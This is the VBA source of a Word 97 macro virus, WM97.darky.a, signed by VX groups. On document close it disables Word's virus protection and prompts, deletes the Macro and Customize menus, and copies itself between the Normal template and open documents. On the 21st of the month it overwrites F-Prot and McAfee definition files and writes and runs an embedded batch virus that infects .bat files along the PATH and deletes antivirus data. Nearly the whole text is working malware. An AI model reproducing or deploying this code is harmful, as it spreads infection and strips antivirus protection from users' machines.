Attribute VB_Name = "darky"
Sub AutoClose()
' [WM97.darky.a]
' by -KD- / Metaphase VX Team & NoMercyVirusTeam 
' Tech used from Mr.Vic, 29/A & NoMercy special thanx
' Special greetz to Darkman & 29/A
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents("darky").Export "c:\darky.dll"
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
Application.ScreenUpdating = False
Application.DisplayStatusBar = False
Application.DisplayAlerts = False
Options.VirusProtection = False
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Customize...").Delete
CommandBars("view").Controls("Toolbars").Delete
CommandBars("view").Controls("Status Bar").Delete
For X = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "darky" Then NormInstall = True
Next X
For X = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "darky" Then ActivInstall = True
Next X
If ActivInstall = True And NormInstall = False Then Set Dm = NormalTemplate.VBProject _
Else If ActivInstall = False And NormInstall = True Then Set Dm = ActiveDocument.VBProject
On Error GoTo leave_darky
If Day(Date) = "21" Then
Open "C:\f-prot\macro.def" For Output As #1
Print #1, " WM97.darky.a"
Print #1, " WM97.darky.a"
Print #1, " WM97.darky.a"
Close #1
SetAttr "C:\f-prot\macro.def", vbReadOnly
Open "C:\program files\mcafee\*.dat" For Output As #2
Print #2, " WM97.darky.a"
Print #2, " WM97.darky.a"
Print #2, " WM97.darky.a"
Close #2
SetAttr "C:\program files\mcafee\*.dat", vbReadOnly
Open "C:\f-macro\*.def" For Output As #3
Print #3, " WM97.darky.a"
Print #3, " WM97.darky.a"
Print #3, " WM97.darky.a"
Close #3
SetAttr "C:\f-macro\*.def", vbReadOnly
Open "c:\darky.bat" For Output As #4
Print #4, ":: [bat._darky.a]"
Print #4, ":: by -KD- / Metaphase VX Team & NoMercyVirusTeam"
Print #4, ":: Greetz to Darkman and 29/A"
Print #4, "::"
Print #4, "@echo off%__darky%"
Print #4, "if '%1=='_darky goto _darky%2"
Print #4, "set _darky=%0.bat"
Print #4, "if not exist %_darky% set _darky=%0"
Print #4, "if '%_darky%==' set _darky=autoexec.bat"
Print #4, "if exist c:\__darky.bat goto _darky_gettin_ya"
Print #4, "if not exist %_darky% goto exist_darky"
Print #4, "find "; CHR$(34); "_darky"; CHR$(34); "<%_darky%>c:\__darky.bat"
Print #4, "attrib c:\__darky.bat +h"
Print #4, ":_darky_gettin_ya"
Print #4, "if '%!_darky%=='-- goto _darky_pay"
Print #4, "set !_darky=%!_darky%-"
Print #4, "command /e:5000 /c c:\__darky _darky vx . .. \ %path%"
Print #4, ":exist_darky"
Print #4, "set _darky="
Print #4, "goto _darky_pay"
Print #4, ":_darkyvx"
Print #4, "shift%__darky%"
Print #4, "if '%2==' exit _darky"
Print #4, "for %%a in (%2\*.bat %2*.bat) do call c:\__darky _darky infect %%a "
Print #4, "goto _darkyvx"
Print #4, ":_darkyinfect"
Print #4, "find '_darky'<%3>nul" 
Print #4, "if not errorlevel 1 goto _darky_jump"
Print #4, "type %3>_darky$"
Print #4, "echo.>>_darky$"
Print #4, "type c:\__darky.bat>>_darky$"
Print #4, "move _darky$ %3>nul"
Print #4, "set _darky#=%_darky#%-"
Print #4, "if %_darky#%==-- exit"
Print #4, ":_darky_jump"
Print #4, "set _darky!=%_darky!%-"
Print #4, "if %_darky!%==-- exit"
Print #4, ":_darky_pay"
Print #4, "echo.|date|find "CHR$(34); "10"; CHR$(34); ">nul._darky"
Print #4, "if errorlevel 1 goto _darky_exit"
Print #4, "echo y| del c:\mcafee\*.dat"
Print #4, "if errorlevel 1 goto darkymsg"
Print #4, ":darkymsg"
Print #4, "echo bat._darky.a by -kd-"
Print #4, ":_darky_exit"
Close #4
SHELL "c:\darky"
Kill "c:\darky.bat"
Else
End If
leave_darky:
On Error Resume Next
Dm.VBComponents.Import ("c:\darky.dll")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
